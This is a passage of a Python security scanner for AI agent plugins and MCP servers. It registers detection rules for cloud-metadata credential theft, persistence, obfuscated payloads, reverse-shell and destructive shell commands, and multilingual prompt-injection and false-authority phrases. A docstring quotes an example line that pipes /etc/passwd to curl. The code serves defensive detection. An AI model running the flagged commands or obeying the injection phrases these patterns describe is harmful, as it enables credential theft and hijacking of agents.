        rule_id="RC-67",
        name="Cryptomining indicators (xmrig / stratum / Monero address)",
        category="abuse",
        severity="CRITICAL",
        description="Cryptomining binary or pool URL or wallet address — silent abuse of user's compute.",
        references=("aguara CRYPTO_001", "OWASP LLM10"),
        cwe="CWE-400",
        fp_guards=("Skip in doc/test files mentioning these as examples (RC-84)",),
    )
)

# -----------------------------------------------------------------------------
# Phase 2e RC-65 — Cloud IMDS (instance-metadata) endpoints + encoding variants
# -----------------------------------------------------------------------------
# Source: aguara SSRF_009-011 (RC-66 variants folded in here per TRDD audit)
# Attack: SSRF or in-skill code that targets cloud metadata endpoints to
# steal IAM credentials. Includes encoding variants that bypass naive
# string-search rules (hex, decimal, octal IPv4 + IPv6 forms).
CLOUD_IMDS_PATTERNS: tuple[re.Pattern[str], ...] = (
    # AWS
    re.compile(r"\b169\.254\.169\.254\b"),
    re.compile(r"\b0xa9fea9fe\b", re.IGNORECASE),  # 169.254.169.254 in hex
    re.compile(r"\b2852039166\b"),  # 169.254.169.254 in decimal
    re.compile(r"\b\[fd00:ec2::254\]"),  # AWS IPv6 IMDS
    # GCP
    re.compile(r"\bmetadata\.google\.internal\b", re.IGNORECASE),
    re.compile(r"\bmetadata-google-internal\b", re.IGNORECASE),
    re.compile(r"\b169\.254\.170\.2\b"),  # GCP IMDS variant
    # Azure
    re.compile(r"\b169\.254\.169\.254\b"),  # Azure shares same IP
    re.compile(r"\bManagedIdentityExtension\b"),
    # Alibaba Cloud
    re.compile(r"\b100\.100\.100\.200\b"),
    # Oracle Cloud
    re.compile(r"\b192\.168\.0\.1\.metadata\b", re.IGNORECASE),
    # ECS / Fargate (AWS task role endpoint)
    re.compile(r"\b/v2/credentials/[a-f0-9-]{36}\b", re.IGNORECASE),
    re.compile(r"\bECS_CONTAINER_METADATA_URI(?:_V[0-9]+)?\b"),
)

# -----------------------------------------------------------------------------
# Phase 2e RC-39 — Persistence beyond plugin lifetime (cron / launchd / shell rc)
# -----------------------------------------------------------------------------
PERSISTENCE_PATTERNS: tuple[re.Pattern[str], ...] = (
    # crontab (Unix scheduled task) — also handles parenthesized echo and
    # quoted arguments: `(echo "...") | crontab`
    re.compile(r"\bcrontab\s+(?:-e|-l|<<|<\s*\S)"),
    re.compile(r"(?:^|[(\s;&|])\s*(?:echo|cat|printf)\s+[^\n|]*?\|\s*crontab\b"),
    re.compile(r">>\s*/etc/(?:crontab|cron\.d/|cron\.daily/|cron\.hourly/)"),
    # macOS launchd (LaunchDaemons / LaunchAgents)
    re.compile(r"/Library/(?:LaunchDaemons|LaunchAgents)/", re.IGNORECASE),
    re.compile(r"~/Library/LaunchAgents/", re.IGNORECASE),
    re.compile(r"\blaunchctl\s+(?:load|bootstrap|start)\b"),
    # systemd user service
    re.compile(r"~/\.config/systemd/user/.+\.service"),
    re.compile(r"\bsystemctl\s+--user\s+(?:enable|start)\b"),
    # macOS login items via `defaults`
    re.compile(r"\bdefaults\s+write\s+(?:com\.apple\.loginitems|loginwindow)", re.IGNORECASE),
    # Shell rc append (.bashrc, .zshrc, .profile)
    re.compile(r">>\s*~/\.(?:bash|zsh|prof)(?:rc|_profile|ile)\b"),
    re.compile(r"echo\s+.*?>>\s*~/\.(?:bash|zsh|prof)"),
    # Windows scheduled task
    re.compile(r"\bschtasks(?:\.exe)?\s+/create\b", re.IGNORECASE),
    # Windows registry Run key
    re.compile(
        r"\b(?:HKLM|HKCU|HKEY_(?:LOCAL_MACHINE|CURRENT_USER))\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        re.IGNORECASE,
    ),
)

# -----------------------------------------------------------------------------
# Phase 2e RC-70 — Generic obfuscation (proximity-to-exec gating)
# -----------------------------------------------------------------------------
# Pattern: encoded payload (atob/Buffer.from/base64.b64decode) within ±3 lines
# of an exec sink (eval/Function/exec/spawn/child_process). The check function
# walks the file with a sliding window, not via single-pattern match.
OBFUSCATION_DECODER_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\batob\s*\("),
    re.compile(r"\bBuffer\.from\s*\(\s*['\"][A-Za-z0-9+/=]{20,}['\"]\s*,\s*['\"]base64['\"]"),
    re.compile(r"\bbase64\.(?:b64decode|standard_b64decode|urlsafe_b64decode)\s*\("),
    re.compile(r"\bdecode\s*\(\s*['\"]base64['\"]\s*\)"),
    re.compile(r"\bcodecs\.decode\s*\(\s*['\"][^'\"]+['\"]\s*,\s*['\"]hex['\"]"),
)
EXEC_SINK_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\beval\s*\("),
    re.compile(r"\bnew\s+Function\s*\("),
    re.compile(r"\bexec\s*\("),
    re.compile(r"\bsubprocess\.(?:run|Popen|call|check_output|check_call)\s*\("),
    re.compile(r"\bos\.system\s*\("),
    re.compile(r"\bchild_process\.(?:exec|spawn|fork|execFile)\s*\("),
    re.compile(r"\bcompile\s*\("),
    re.compile(r"\bImports?\.System\.exec"),
)


def find_obfuscated_exec(content: str, proximity_lines: int = 3) -> list[tuple[int, str]]:
    """Return list of (line_number, message) for decoder + exec-sink within proximity.

    A finding fires when:
    1. A line matches an OBFUSCATION_DECODER_PATTERN, AND
    2. Some line within ±proximity_lines matches an EXEC_SINK_PATTERN.

    Both must be true for the finding to fire (RC-70 source: skillscan MAL-051).
    """
    lines = content.split("\n")
    decoder_hits: list[int] = []
    exec_hits: list[int] = []
    for idx, line in enumerate(lines):
        if any(p.search(line) for p in OBFUSCATION_DECODER_PATTERNS):
            decoder_hits.append(idx)
        if any(p.search(line) for p in EXEC_SINK_PATTERNS):
            exec_hits.append(idx)

    findings: list[tuple[int, str]] = []
    for d_idx in decoder_hits:
        for e_idx in exec_hits:
            if abs(d_idx - e_idx) <= proximity_lines:
                findings.append(
                    (
                        d_idx + 1,
                        f"obfuscated decode at line {d_idx + 1} within {abs(d_idx - e_idx)} lines of "
                        f"exec sink at line {e_idx + 1}",
                    )
                )
                break
    return findings


register_rule(
    RuleSchema(
        rule_id="RC-65",
        name="Cloud IMDS endpoint (with encoding variants)",
        category="ssrf",
        severity="MAJOR",
        description="Cloud instance-metadata endpoint — IAM credential theft vector. Includes hex/decimal/IPv6 variants.",
        references=("aguara SSRF_009-011", "RC-66 folded"),
        cwe="CWE-918",
        fp_guards=("Skip in test/doc files (RC-84)", "Skip in fenced code blocks (RC-83)"),
    )
)

register_rule(
    RuleSchema(
        rule_id="RC-39",
        name="Persistence beyond plugin lifetime (cron/launchd/RC files/registry)",
        category="persistence",
        severity="MAJOR",
        description="Modifies cron/launchd/systemd/shell-rc/Windows-Run for execution after plugin uninstall.",
        references=("vexscan PERSIST-001", "emelyanowcom"),
        cwe="CWE-506",
        fp_guards=("Skip in test/doc files (RC-84)", "Skip in fenced code (RC-83)"),
    )
)

register_rule(
    RuleSchema(
        rule_id="RC-70",
        name="Generic obfuscation with proximity-to-exec",
        category="evasion",
        severity="CRITICAL",
        description="Base64/hex decoder within ±3 lines of an exec sink — likely encoded payload execution.",
        references=("skillscan MAL-051", "RC-71 sibling"),
        cwe="CWE-506",
        fp_guards=("Skip in test/doc files (RC-84)", "Skip in fenced code (RC-83)"),
    )
)


# -----------------------------------------------------------------------------
# RC-68 — Multi-layer encoding decoder (TRDD-0f1f7889 Phase 1 gap-fill, 2026-05-10)
# -----------------------------------------------------------------------------
# Source: aguara CRYPTO_002, vexscan EVASION_004, vetskill OBFUS_001
# Attack: payload is encoded twice (or via two distinct schemes — base64 over
# hex over url-quote) so a single-layer decoder used by RC-70 misses the
# inner string. The detector recursively decodes up to MAX_DEPTH=4 layers
# and inspects each intermediate decoding for exec/eval/shell sinks.
#
# Why distinct from RC-70: RC-70 fires on a SINGLE decoder near an exec
# sink (proximity-based). RC-68 fires when the LITERAL ITSELF, recursively
# decoded, contains a sink — even if the decoder call chain is split across
# multiple lines or wrapped in helper functions.
#
# WARNING severity per TRDD §7 — promote after one minor of FP validation.
# (imports `_rc68_base64` and `_rc68_binascii` declared at module top.)

_RC68_MAX_DEPTH = 4
_RC68_MIN_LENGTH = 16  # Skip tiny base64 strings (high-FP, low signal)
_RC68_BASE64_PATTERN = re.compile(r"['\"]([A-Za-z0-9+/=]{16,})['\"]")
_RC68_HEX_PATTERN = re.compile(r"['\"]([0-9a-fA-F]{32,})['\"]")
# Decoder calls that signal "this string is going to be decoded at runtime"
_RC68_DECODER_CALLS = re.compile(
    r"\b(?:atob|base64\.b64decode|base64\.standard_b64decode|base64\.urlsafe_b64decode|"
    r"Buffer\.from|bytes\.fromhex|codecs\.decode|binascii\.unhexlify|binascii\.a2b_hex|"
    r"base64\.decodestring|base64\.decodebytes)\s*\("
)
# Sinks that, if found inside a decoded layer, escalate the finding.
_RC68_SINK_RE = re.compile(
    r"\b(?:eval\s*\(|exec\s*\(|system\s*\(|popen\s*\(|subprocess\.|child_process\.|"
    r"Function\s*\(|os\.system|/dev/tcp|/bin/sh|/bin/bash)"
)


def _rc68_try_decode(literal: str) -> str | None:
    """Try base64 then hex; return decoded text or None."""
    # base64 attempt
    try:
        # validate=True rejects non-base64 alphabet noise quickly
        decoded = _rc68_base64.b64decode(literal, validate=True)
        text = decoded.decode("utf-8", errors="strict")
        return text
    except (ValueError, _rc68_binascii.Error, UnicodeDecodeError):
        pass
    # hex attempt
    try:
        decoded = bytes.fromhex(literal)
        text = decoded.decode("utf-8", errors="strict")
        return text
    except (ValueError, UnicodeDecodeError):
        pass
    return None


def detect_multilayer_encoded_payload(content: str) -> list[tuple[int, int, str]]:
    """Return list of (line_number, layers, sink_match) for RC-68 findings.

    A finding fires when:
    1. A line contains a decoder call (atob, base64.b64decode, ...) AND
    2. A literal string on or near that line, recursively decoded up to
       MAX_DEPTH layers, reveals an exec/eval/shell sink.

    Returns:
        list of tuples: (line_number, layer_depth_at_which_sink_appeared,
        first_60_chars_of_sink_match)
    """
    lines = content.split("\n")
    findings: list[tuple[int, int, str]] = []
    for idx, line in enumerate(lines):
        # Phase 1: must have a decoder call on this line OR within ±2 lines
        window_start = max(0, idx - 2)
        window_end = min(len(lines), idx + 3)
        window = "\n".join(lines[window_start:window_end])
        if not _rc68_DECODER_PATTERN_search(window):
            continue
        # Phase 2: extract candidate literals from this line
        candidates: list[str] = []
        for m in _RC68_BASE64_PATTERN.finditer(line):
            candidates.append(m.group(1))
        for m in _RC68_HEX_PATTERN.finditer(line):
            candidates.append(m.group(1))
        for cand in candidates:
            if len(cand) < _RC68_MIN_LENGTH:
                continue
            # Phase 3: recursive decode up to MAX_DEPTH layers
            current = cand
            for layer in range(1, _RC68_MAX_DEPTH + 1):
                decoded = _rc68_try_decode(current)
                if decoded is None:
                    break
                # Check for sinks in this decoded layer
                sink_match = _RC68_SINK_RE.search(decoded)
                if sink_match:
                    findings.append((idx + 1, layer, sink_match.group(0)[:60]))
                    break
                # If the decoded layer itself looks like another base64/hex,
                # try another decode round
                if not (re.fullmatch(r"[A-Za-z0-9+/=\s]+", decoded) or re.fullmatch(r"[0-9a-fA-F\s]+", decoded)):
                    break
                # Strip whitespace for next round
                current = re.sub(r"\s+", "", decoded)
                if len(current) < _RC68_MIN_LENGTH:
                    break
    return findings


def _rc68_DECODER_PATTERN_search(text: str) -> bool:  # noqa: N802
    """Return True if `text` contains an RC-68 decoder call signature."""
    return bool(_RC68_DECODER_CALLS.search(text))


register_rule(
    RuleSchema(
        rule_id="RC-68",
        name="Multi-layer encoded payload (recursive decode reveals sink)",
        category="evasion",
        severity="WARNING",  # Per TRDD §7 — promote to CRITICAL after FP validation
        description=(
            "A literal string near a decoder call, when decoded recursively "
            f"up to {_RC68_MAX_DEPTH} layers, reveals an exec/eval/shell sink — "
            "single-layer scanners miss this."
        ),
        references=("aguara CRYPTO_002", "vexscan EVASION_004", "vetskill OBFUS_001"),
        cwe="CWE-506",
        fp_guards=(
            "Skip in test/doc files (RC-84)",
            "Skip in fenced code blocks (RC-83)",
            "Skip strings shorter than 16 chars (high FP rate)",
            "Recursion bounded at MAX_DEPTH=4 (terminates on cycle/non-decodable)",
        ),
    )
)


# -----------------------------------------------------------------------------
# RC-55 — MCP unbounded retry / rate-limit abuse (TRDD-0f1f7889 Phase 3 gap-fill)
# -----------------------------------------------------------------------------
# Source: aguara MCP-008, vexscan MCP-014
# Attack: MCP server retries failed operations in a tight loop — used for
# brute-forcing credentials, exhausting target rate limits, or keeping a
# stuck connection alive forever. The classifier looks for:
#   - `while True:` wrapping a network call with `continue` on exception
#   - `for i in range(>=10000)` wrapping a network/exec call
#   - Recursive function call in except handler with no decay/bound
#
# Bounded retries with exponential backoff (e.g. `for attempt in range(3)
# ... time.sleep(2 ** attempt) ... break`) are NOT flagged.
#
# WARNING severity per TRDD §7.
_RC55_NETWORK_OR_EXEC_RE = re.compile(
    r"\b(?:requests\.(?:get|post|put|delete|head)|urllib\.request\.|urlopen\(|"
    r"http\.client\.|fetch\s*\(|socket\.connect|subprocess\.(?:run|Popen|call)|"
    r"os\.system|child_process\.exec)"
)
# Detect "for i in range(N)" with N >= 10000
_RC55_HUGE_RANGE_RE = re.compile(r"\bfor\s+\w+\s+in\s+range\s*\(\s*(\d{5,})\s*[,)]")


def detect_mcp_unbounded_retry(content: str) -> list[tuple[int, str]]:
    """Return list of (line_number, reason) for RC-55 findings.

    Detects:
    - `while True:` blocks containing a network/exec call AND an except clause
      with `continue` or `pass` (i.e. retry-on-error with no decay).
    - `for i in range(BIG):` (>= 10000) loops containing a network/exec call.

    Excludes bounded retries with `break` on success or with `time.sleep`
    backoff — those are legitimate retry-with-backoff patterns.
    """
    lines = content.split("\n")
    findings: list[tuple[int, str]] = []
    n = len(lines)
    i = 0
    while i < n:
        line = lines[i]
        # Pattern A: `while True:`
        if re.search(r"^\s*while\s+(?:True|1)\s*:\s*(?:#.*)?$", line):
            # Look ahead up to 30 lines (typical loop body) to see if there's
            # a network/exec call AND a continue/pass in an except handler.
            block_end = min(i + 30, n)
            block = "\n".join(lines[i:block_end])
            has_network = bool(_RC55_NETWORK_OR_EXEC_RE.search(block))
            has_except_continue = bool(re.search(r"except\b[^:]*:\s*\n\s+(?:continue|pass)\b", block))
            has_break_or_return = bool(re.search(r"\b(?:break|return)\b", block))
            # Fire only when we have BOTH network call AND retry-on-error pattern,
            # AND no obvious termination break/return short-circuit on success.
            if has_network and has_except_continue:
                # Heuristic: if break/return appears INSIDE an except, it's the
                # legitimate "give up after error" pattern; otherwise it's
                # likely a "break on success" inside try — the retry-loop is
                # genuinely unbounded.
                if (
                    not re.search(
                        r"except\b[^:]*:[^\n]*(?:\n\s+[^\n]*)*?\n\s+(?:break|return)\b",
                        block,
                    )
                    or not has_break_or_return
                ):
                    findings.append((i + 1, "while True with retry-on-error and no decay"))
            i = block_end
            continue
        # Pattern B: `for i in range(BIG):`
        m = _RC55_HUGE_RANGE_RE.search(line)
        if m:
            count = int(m.group(1))
            if count >= 10000:
                block_end = min(i + 30, n)
                block = "\n".join(lines[i:block_end])
                if _RC55_NETWORK_OR_EXEC_RE.search(block):
                    findings.append((i + 1, f"for-range({count}) loop containing network/exec call"))
            i = block_end
            continue
        i += 1
    return findings


register_rule(
    RuleSchema(
        rule_id="RC-55",
        name="MCP unbounded retry / rate-limit abuse",
        category="mcp",
        severity="WARNING",
        description=(
            "MCP server contains a tight retry loop (`while True` + retry-on-error, "
            "or `for i in range(>=10000)`) around a network/exec call — "
            "credential brute-force or rate-limit exhaustion vector."
        ),
        references=("aguara MCP-008", "vexscan MCP-014"),
        cwe="CWE-770",
        fp_guards=(
            "Bounded retries with exponential backoff are not flagged",
            "Loops without network/exec calls are not flagged",
            "Skip in test files (RC-84)",
        ),
    )
)


# -----------------------------------------------------------------------------
# RC-82 — Tiered shell-command classifier (TRDD-0f1f7889 Phase 3d gap-fill)
# -----------------------------------------------------------------------------
# Source: aguara SUPPLY_010 (severity-bucket classifier)
# Each shell command in a hook/agent body is classified into one of:
#   - "tier0_safe": ls, cat, echo, pwd, date (read-only utilities)
#   - "tier1_suspicious": curl, wget, ssh, nc, scp (network/external)
#   - "tier2_dangerous": rm -rf, chmod, sudo, dd (destructive/privilege)
#   - "tier3_critical": eval, exec, /dev/tcp, base64-pipe-sh (RCE primitives)
#   - "unknown": unrecognized
#
# Used by callers (validate_hook.py, validate_agent.py) to attach a
# severity tier to each shell-command finding instead of treating every
# shell command identically.
_RC82_TIER3_RE = re.compile(
    r"(?:^|\s)(?:eval\s*\$\(|eval\s+`|exec\s+\d?(?:>|<)\s*/dev/tcp|"
    r"bash\s+-i\s*>&\s*/dev/tcp|sh\s+-i\s*>&\s*/dev/tcp|"
    r"\bbase64\s+-[dD]\b.*\|\s*(?:sh|bash|zsh)|"
    r"\bxxd\s+-r\b.*\|\s*(?:sh|bash))"
)
_RC82_TIER2_RE = re.compile(
    r"(?:^|\s)(?:rm\s+-[rRf]+|chmod\s+(?:[ugoa]?[+=][rwxsStTugo]+|[0-7]{3,4})|"
    r"chown\s+|sudo\b|dd\s+if=|mkfs\b|fdisk\b|wipefs\b|shred\b|"
    r"format\s+[A-Z]:|del\s+/[fsq]+)"
)
_RC82_TIER1_RE = re.compile(
    r"(?:^|\s)(?:curl|wget|ssh|sftp|scp|nc|netcat|socat|"
    r"git\s+clone|git\s+pull|git\s+push|"
    r"npm\s+install|pip\s+install|pnpm\s+install|yarn\s+add|"
    r"docker\s+pull|docker\s+run|podman\s+pull)\b"
)
_RC82_TIER0_RE = re.compile(
    r"(?:^|\s)(?:ls|cat|echo|pwd|date|head|tail|grep|find|wc|"
    r"sort|uniq|cut|awk|sed|tr|tee|"
    r"basename|dirname|realpath|"
    r"true|false|test|\[)\b"
)


def classify_shell_command_tier(cmd: str) -> str:
    """Return tier label for a shell command string.

    Tiers (ordered most-severe-first; first match wins):
        - "tier3_critical"  — RCE primitives (eval pipe, /dev/tcp shell, base64-pipe-sh)
        - "tier2_dangerous" — Destructive / privilege escalation (rm -rf, chmod, sudo)
        - "tier1_suspicious" — Network / external interaction (curl, wget, ssh)
        - "tier0_safe"      — Read-only utilities (ls, cat, echo, pwd)
        - "unknown"         — Unrecognized command verb

    The classifier is intentionally conservative — when a single command
    line contains tokens from multiple tiers (e.g. `cat /etc/passwd | curl
    -d @- http://exfil`), the highest tier wins.
    """
    if not cmd or not cmd.strip():
        return "unknown"
    if _RC82_TIER3_RE.search(cmd):
        return "tier3_critical"
    if _RC82_TIER2_RE.search(cmd):
        return "tier2_dangerous"
    if _RC82_TIER1_RE.search(cmd):
        return "tier1_suspicious"
    if _RC82_TIER0_RE.search(cmd):
        return "tier0_safe"
    return "unknown"


register_rule(
    RuleSchema(
        rule_id="RC-82",
        name="Tiered shell-command classifier",
        category="hook-abuse",
        severity="WARNING",
        description=(
            "Classify shell commands into 4 severity tiers (safe/suspicious/"
            "dangerous/critical) so callers can apply proportional severity."
        ),
        references=("aguara SUPPLY_010",),
        cwe="CWE-78",
        fp_guards=(
            "Tier0 (safe) commands produce no finding",
            "Tier1+ commands inherit caller's existing severity policy",
        ),
    )
)


# -----------------------------------------------------------------------------
# RC-107 — Pre-installation URI scan (TRDD-0f1f7889 Phase 5 gap-fill)
# -----------------------------------------------------------------------------
# Source: vexscan PREINSTALL-001, agentvet PREINSTALL-002
# Extract install-target URIs from a plugin so a downstream tool (npm
# audit, pip install --dry-run, oci scan) can pre-vet them without
# executing the install.
#
# Returns a list of (kind, uri) tuples:
#   - kind ∈ {"npm", "pypi", "oci", "git"}
#   - uri is the package@version, image:tag, or repo URL
#
# Not registered as a finding-emitting rule — purely an extraction
# helper consumed by Phase 5 specialist-tool delegation.
_RC107_NPM_RE = re.compile(
    r"\b(?:npm|pnpm|yarn)\s+(?:install|add|i)(?:\s+(?:-[a-zA-Z]+|--\S+))*\s+"
    r"((?:@[a-zA-Z0-9_-]+/)?[a-zA-Z0-9_.-]+(?:@[\w.-]+)?)"
)
_RC107_NPX_RE = re.compile(r"\bnpx\s+(?:create-)?([a-zA-Z0-9_./@-]+)")
_RC107_PIP_RE = re.compile(
    r"\b(?:pip|pip3|pipx|uv\s+add|uv\s+pip\s+install)\s+(?:install\s+)?"
    r"(?:(?:-[a-zA-Z]+|--\S+)\s+)*"
    r"([a-zA-Z0-9_.-]+(?:[<>=!~]+[\w.*-]+)?)"
)
_RC107_DOCKER_FROM_RE = re.compile(r"^\s*FROM\s+([a-zA-Z0-9._/-]+(?::[\w.-]+)?)", re.MULTILINE)
_RC107_DOCKER_PULL_RE = re.compile(
    r"\b(?:docker|podman)\s+(?:pull|run)(?:\s+(?:-[a-zA-Z]+|--\S+))*\s+"
    r"([a-zA-Z0-9._/-]+(?::[\w.-]+)?)"
)


def extract_install_uris(content: str) -> list[tuple[str, str]]:
    """Extract install-target URIs from `content`.

    Returns a list of (kind, uri) tuples where kind is one of
    {"npm", "pypi", "oci", "git"} and uri is the install target.

    Includes matches from comments and string literals — the caller is
    expected to be a pre-installation scanner that wants the broadest
    possible candidate list.
    """
    results: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    def _add(kind: str, uri: str) -> None:
        # Dedupe and skip flag-looking false matches
        uri = uri.strip().rstrip(",;.")
        if not uri or uri.startswith("-"):
            return
        if (kind, uri) in seen:
            return
        seen.add((kind, uri))
        results.append((kind, uri))

    for m in _RC107_NPM_RE.finditer(content):
        _add("npm", m.group(1))
    for m in _RC107_NPX_RE.finditer(content):
        _add("npm", m.group(1))
    for m in _RC107_PIP_RE.finditer(content):
        _add("pypi", m.group(1))
    for m in _RC107_DOCKER_FROM_RE.finditer(content):
        _add("oci", m.group(1))
    for m in _RC107_DOCKER_PULL_RE.finditer(content):
        _add("oci", m.group(1))
    # Also catch `alpine:latest sh` / `python:3.12-slim` style lines that
    # appeared in the test fixture without an explicit pull/FROM keyword.
    # We use a wider catch-all only when the line contains a known image-tag
    # shape and a runtime verb.
    for line in content.split("\n"):
        if re.search(r"\b(?:run|exec)\b", line, re.IGNORECASE):
            for m in re.finditer(r"\b([a-z0-9][a-z0-9._-]*:[\w.-]+)\b", line):
                tag = m.group(1)
                # Reject host:port-looking strings (numeric after colon = port)
                if not re.fullmatch(r"[a-z0-9][a-z0-9._-]*:\d+", tag):
                    _add("oci", tag)

    return results


register_rule(
    RuleSchema(
        rule_id="RC-107",
        name="Pre-installation URI extraction",
        category="supply-chain",
        severity="WARNING",
        description=(
            "Helper rule — extracts npm/pypi/oci install targets so a "
            "downstream specialist tool can pre-vet them without execution."
        ),
        references=("vexscan PREINSTALL-001", "agentvet PREINSTALL-002"),
        cwe="CWE-829",
        fp_guards=(
            "Helper-only — produces no findings on its own",
            "Caller decides whether to enrich each URI with a remote-vet call",
        ),
    )
)


# =============================================================================
# Phase 3 — ~30 MAJOR net-new rules (4 sub-phases compact catalog)
# =============================================================================
#
# Phase 3 follows Phase 2's "extend existing pattern lists" approach but for
# rules that lack an existing list. Each rule below registers its RuleSchema
# and contributes one or more regex patterns to the shared PHASE3_PATTERNS
# list (consumed by check_phase3_all in validate_security.py).
#
# Format: each entry is a (rule_id, severity, regex, message_template) tuple.
# The check function iterates this list once per file, applying Phase 0
# FP-reduction (fence skip, negation guard, defensive demotion).

# (rule_id, severity, regex, message_template)
PHASE3_PATTERNS: list[tuple[str, str, "re.Pattern[str]", str]] = [
    # -------------------------------------------------------------------------
    # Phase 3a — Prompt-injection extended (RC-02/03/05/08/25/90/91/92/93/99/108)
    # (RC-07 covered in Phase 2a; RC-02 + RC-43 differ — RC-02 is prose form,
    # RC-43 is code-form already in Phase 1)
    # -------------------------------------------------------------------------
    (
        "RC-02",
        "MAJOR",
        re.compile(
            r"\b(?:if|when|once)\s+(?:you\s+(?:see|notice|encounter)|the\s+user\s+(?:says|asks|requests))\s+"
            r"[\"'\w][^\n]{2,80}\s*[,;:]?\s*(?:then|do|please|first)",
            re.IGNORECASE,
        ),
        "RC-02: prose conditional / time-bomb prompt injection",
    ),
    (
        "RC-03",
        "MAJOR",
        re.compile(
            r"\b(?:URGENT|EMERGENCY|critical|immediate)\s*[:!]?\s*"
            r"(?:lives|safety|health|future|company|user)\s+(?:depend|hinge|rely)\s+on",
            re.IGNORECASE,
        ),
        "RC-03: coercive authority / urgency manipulation",
    ),
    (
        "RC-03",
        "MAJOR",
        re.compile(r"\byou\s+MUST\s+(?:do|comply|follow|obey|execute)\b"),
        "RC-03: coercive authority — emphasized MUST",
    ),
    (
        "RC-05",
        "MAJOR",
        re.compile(
            r"\bas\s+(?:a|an|the)\s+(?:developer|admin(?:istrator)?|owner|operator|maintainer)\s+"
            r"(?:with\s+)?(?:full|all|unrestricted|elevated|privileged)\s+(?:access|permissions?|rights?|capabilities)",
            re.IGNORECASE,
        ),
        "RC-05: role-priority / capability-claim impersonation",
    ),
    (
        "RC-08",
        "MAJOR",
        re.compile(
            r"\b(?:Anthropic|OpenAI|the\s+team|Claude\s+team|engineers?)\s+"
            r"(?:have\s+|has\s+)?(?:updated|changed|removed|disabled|modified)\s+"
            r"(?:your|the)\s+(?:policy|guidelines?|safety|restrictions?|behavior|alignment)",
            re.IGNORECASE,
        ),
        "RC-08: Anthropic / system-admin false-authority impersonation",
    ),
    (
        "RC-25",
        "MAJOR",
        re.compile(
            r"!\[[^\]]*\]\(https?://[^\s)]+(?:\?|&)(?:[a-z_]+=[^&\s)]*&?){2,}\)",
            re.IGNORECASE,
        ),
        "RC-25: markdown image beacon (URL with multiple query params — exfil channel)",
    ),
    (
        "RC-90",
        "MAJOR",
        re.compile(
            r"\[(?:IMPORTANT|SYSTEM|ADMIN|ALERT|CRITICAL|URGENT|MUST|REQUIRED)\]\s*[:!]?\s*"
            r"(?:ignore|disregard|forget|override|bypass|reveal|show|execute|run)",
            re.IGNORECASE,
        ),
        "RC-90: IMPORTANT-tag / bracket amplification of injection imperative",
    ),
    (
        "RC-91",
        "MAJOR",
        re.compile(
            r"<!--\s*(?:ignore|disregard|forget|override|execute|run|do\s+not\s+show)[^\n]{1,200}-->",
            re.IGNORECASE,
        ),
        "RC-91: hidden HTML comment containing action verb",
    ),
    (
        "RC-92",
        "MAJOR",
        re.compile(
            r"<(?:div|span)\s+[^>]*style=[\"'][^\"']*"
            r"(?:display:\s*none|visibility:\s*hidden|opacity:\s*0|color:\s*(?:white|#fff)|font-size:\s*0)",
            re.IGNORECASE,
        ),
        "RC-92: CSS-hidden injection (display:none, opacity:0, color:white)",
    ),
    (
        "RC-92",
        "MAJOR",
        re.compile(r"<details\s+open\s*=\s*[\"']?false[\"']?>"),
        "RC-92: collapsible <details> element with hidden content",
    ),
    (
        "RC-93",
        "MAJOR",
        re.compile(r"\S\s{30,}\S"),
        "RC-93: line with ≥30 contiguous spaces — visual deception (off-screen text)",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(r"忽略.*?(?:指令|规则|说明|提示)"),
        "RC-99: Mandarin prompt injection (忽略...指令)",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(r"无视.*?(?:之前|以上|系统)"),
        "RC-99: Mandarin prompt injection (无视...之前/以上/系统)",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(r"以前の.*?(?:指示|ルール|ガイドライン).*?(?:無視|忘れ)"),
        "RC-99: Japanese prompt injection (以前の...指示/ルール/ガイドライン...無視/忘れ)",
    ),
    ("RC-99", "CRITICAL", re.compile(r"이전.*?(?:지시|규칙|지침).*?(?:무시|잊)"), "RC-99: Korean prompt injection"),
    (
        "RC-99",
        "CRITICAL",
        re.compile(
            r"\b(?:olvida|ignora|olvide|ignore)\s+(?:las?|los?)\s+"
            r"instrucci[oó]n(?:es)?\s+(?:anterior(?:es)?|previa(?:s)?)",
            re.IGNORECASE,
        ),
        "RC-99: Spanish prompt injection",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(r"\bignorez\s+(?:les\s+)?instructions?\s+pr[eé]c[eé]dent(?:es)?", re.IGNORECASE),
        "RC-99: French prompt injection",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(
            r"\b(?:ignoriere|vergiss)\s+(?:die\s+)?(?:vorherigen?|vorigen?)\s+(?:Anweisungen|Regeln)",
            re.IGNORECASE,
        ),
        "RC-99: German prompt injection",
    ),
    (
        "RC-99",
        "CRITICAL",
        re.compile(
            r"(?:Игнорируй|Забудь)\s+(?:все\s+)?предыдущие\s+(?:инструкции|указания)",
            re.IGNORECASE,
        ),
        "RC-99: Russian prompt injection",
    ),
    ("RC-99", "CRITICAL", re.compile(r"تجاهل\s+(?:كل\s+)?التعليمات\s+السابقة"), "RC-99: Arabic prompt injection"),
    (
        "RC-108",
        "MAJOR",
        re.compile(
            r"<!--\s*\[\s*INSTRUCT(?:ION)?S?\s*\]\s*[\s\S]{1,500}-->",
            re.IGNORECASE,
        ),
        "RC-108: comment-hidden injection bracket — LLMs read comments, regex misses them",
    ),
    # -------------------------------------------------------------------------
    # Phase 3b — MCP / agent extras (RC-46/48/51/52/53/54/55/56/57/58/59/60/63)
    # -------------------------------------------------------------------------
    (
        "RC-46",
        "MAJOR",
        re.compile(r"--(?:no-sandbox|allow-dangerous|disable-web-security|insecure)\b"),
        "RC-46: MCP / browser security-disabling argument",
    ),
    (
        "RC-48",
        "CRITICAL",
        re.compile(r"\"args\"\s*:\s*\[[^\]]*[\";]\s*(?:rm\s|curl\s|wget\s|sh\s)"),
        "RC-48: MCP args contains shell metacharacters / command injection vector",
    ),
    (
        "RC-48",
        "CRITICAL",
        re.compile(r"\"args\"\s*:\s*\[[^\]]*[\$`][\(<]"),
        "RC-48: MCP args contains shell substitution `$( ` or `<( `",
    ),
    (
        "RC-51",
        "MAJOR",
        re.compile(
            r"\"(?:retry|retries|maxRetries|max_retries)\"\s*:\s*(?:-1|\"?(?:Infinity|inf|none|unlimited)\"?|[0-9]{4,})",
            re.IGNORECASE,
        ),
